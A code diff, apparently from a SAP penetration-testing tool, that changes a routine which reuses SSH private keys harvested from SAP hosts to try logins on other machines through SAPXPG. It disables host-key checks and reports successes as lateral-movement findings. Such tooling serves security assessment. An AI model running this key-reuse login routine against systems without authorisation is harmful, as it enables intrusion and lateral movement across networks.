@@ -815,10 +815,13 @@ def ssh_test_keys(node: SAPNode, state: SAPMAPState,
 
             for username in usernames_to_try:
                 tested += 1
-                # Call ssh directly (no /bin/sh wrapper) — SAPXPG
-                # splits PARAMS on spaces, creating correct argv
-                # entries for ssh.  The /bin/sh -c wrapping breaks
-                # because nested quotes get mangled.
+                # Remote command must be a single word — no
+                # semicolons or && operators — because SAPXPG
+                # routes EXTPROG+PARAMS through a shell, so any
+                # shell metacharacters are interpreted locally
+                # instead of being passed to the remote SSH shell.
+                # `id` is POSIX-standard, single-word, and tells
+                # us the remote uid.
                 ssh_args = (
                     f"-o BatchMode=yes "
                     f"-o StrictHostKeyChecking=no "
@@ -827,46 +830,34 @@ def ssh_test_keys(node: SAPNode, state: SAPMAPState,
                     f"-o LogLevel=ERROR "
                     f"-i {key_path} "
                     f"{username}@{target} "
-                    f"echo SSH_OK; whoami; hostname; uname -a"
+                    f"id"
                 )
                 if _run_prog:
                     out = _run_prog("ssh", ssh_args)
                 else:
                     out = exec_fn(
                         f"ssh {ssh_args} 2>/dev/null")
-                if not out or "SSH_OK" not in out:
+                if not out or "uid=" not in out:
                     snippet = (out or "").strip()[:120]
-                    if snippet:
-                        logger.debug(f"ssh {username}@{target}: "
-                                     f"{snippet!r}")
-                    else:
-                        print(f"  [-] ssh {username}@{target} "
-                              f"({key_owner}:{key['type']}): "
-                              f"no output (rejected or unreachable)")
+                    print(f"  [-] ssh {username}@{target} "
+                          f"({key_owner}:{key['type']}): "
+                          f"{snippet or 'no output'}")
                     failed.add(target)
                     continue
 
-                # SSH_OK found — successful login
-                lines = out.strip().splitlines()
-                ssh_ok_idx = next(
-                    (i for i, l in enumerate(lines)
-                     if "SSH_OK" in l), -1)
-                remote_user = (lines[ssh_ok_idx + 1].strip()
-                               if ssh_ok_idx + 1 < len(lines)
-                               else "?")
-                remote_host = (lines[ssh_ok_idx + 2].strip()
-                               if ssh_ok_idx + 2 < len(lines)
-                               else "?")
-                remote_uname = (lines[ssh_ok_idx + 3].strip()
-                                if ssh_ok_idx + 3 < len(lines)
-                                else "?")
+                # uid= found — successful login; parse remote user
+                import re as _re
+                id_line = next(
+                    (l for l in out.strip().splitlines()
+                     if "uid=" in l), "")
+                m = _re.search(r"uid=\d+\(([^)]+)\)", id_line)
+                remote_user = m.group(1) if m else username
 
                 entry = {
                     "target": target,
                     "username": username,
                     "remote_user": remote_user,
-                    "remote_hostname": remote_host,
-                    "remote_uname": remote_uname,
+                    "remote_id": id_line.strip(),
                     "key_owner": key_owner,
                     "key_path": key_path,
                     "key_type": key["type"],
@@ -876,16 +867,14 @@ def ssh_test_keys(node: SAPNode, state: SAPMAPState,
 
                 print(f"  [+] SSH ACCESS: {key_owner}@{sid} → "
                       f"{username}@{target} "
-                      f"(key={key['type']}, remote={remote_user}"
-                      f"@{remote_host})")
+                      f"(key={key['type']}, remote={remote_user})")
 
                 emit_finding(
                     "CRITICAL", sid,
                     f"SSH lateral movement: {key_owner}'s "
                     f"{key['type']} key on {sid} grants access "
                     f"to {username}@{target} "
-                    f"(remote user={remote_user}, "
-                    f"host={remote_host}). "
+                    f"(remote user={remote_user}). "
                     f"Generic/shared OS accounts enable "
                     f"cross-system access without SAP "
                     f"credentials.",
